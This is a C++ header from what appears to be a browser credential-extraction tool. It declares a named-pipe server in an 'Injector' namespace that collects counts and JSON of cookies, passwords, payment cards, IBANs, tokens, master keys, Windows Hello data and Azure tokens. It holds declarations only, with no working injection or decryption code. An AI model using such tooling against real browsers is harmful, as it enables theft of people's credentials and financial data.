// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#pragma once

#include "../core/common.hpp"
#include <memory>
#include <filesystem>
#include <string>
#include <nlohmann/json.hpp>

using json = nlohmann::json;

namespace Injector {

    struct BrowserData {
        std::string name;
        std::string version;
        int cookies = 0;
        int cookiesTotal = 0;
        int passwords = 0;
        int cards = 0;
        int ibans = 0;
        int tokens = 0;
        int profiles = 0;
        bool noAbe = false;
        json extraSecrets = json::array();
    };

    struct ExtractionStats {
        int cookies = 0;
        int cookiesTotal = 0;
        int passwords = 0;
        int cards = 0;
        int ibans = 0;
        int tokens = 0;
        int profiles = 0;
        bool noAbe = false;
    };

    class PipeServer {
    public:
        explicit PipeServer(const std::wstring& browserType);
        void Create();
        void WaitForClient();
        void SendConfig(bool verbose, bool fingerprint, const std::filesystem::path& output);
        void ProcessMessages(bool verbose);

        // Getters for data extraction
        std::wstring GetName() const { return m_pipeName; }
        ExtractionStats GetStats() const { return m_stats; }
        std::string GetBrowserDataAsJson() const;
        json GetExtraSecretsJson() const;
        std::string GetBrowserName() const { return m_browserName; }
        const BrowserData& GetBrowserData() const { return m_browserData; }

    private:
        void Write(const std::string& msg);
        std::wstring GenerateName(const std::wstring& browserType);
        static std::string EscapeJson(const std::string& s);

        std::wstring m_pipeName;
        std::wstring m_browserType;
        Core::HandlePtr m_hPipe;
        ExtractionStats m_stats;
        std::string m_outputPath;
        std::string m_browserName;
        BrowserData m_browserData;

        // JSON array for extra secrets (shared across all browsers)
        json m_extraSecretsArray = json::array();

        // Tracking flags for "not found" entries
        bool m_userMasterKeyFound = false;
        bool m_machineMasterKeyFound = false;
        bool m_windowsHelloFound = false;
        bool m_azureTokenFound = false;
    };

}
